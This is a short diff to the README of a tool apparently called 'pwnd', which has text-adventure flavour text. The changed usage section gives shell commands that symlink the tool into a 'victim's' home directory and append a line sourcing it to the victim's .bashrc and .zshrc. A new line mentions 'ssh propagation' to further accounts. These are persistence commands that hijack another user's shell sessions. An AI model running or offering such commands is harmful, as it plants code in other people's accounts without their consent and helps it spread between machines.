@@ -8,8 +8,10 @@ a nearby rock, and grip it tightly with one hand as you head off in the
 direction of the ominous noise...
 
 # usage
+Currently, ssh propagation requires .pwnd be present in the victim's homedir
 ```
-echo "source $HOME/pwnd/.pwnd" >> ~victim/.{bash,zsh}rc
+ln -s $HOME/pwnd/.pwnd ~victim/.pwnd
+echo "source ~victim/.pwnd" >> ~victim/.{bash,zsh}rc
 ```
 # escape
 Currently, the simplest way to escape is simply to reference the binary directly.
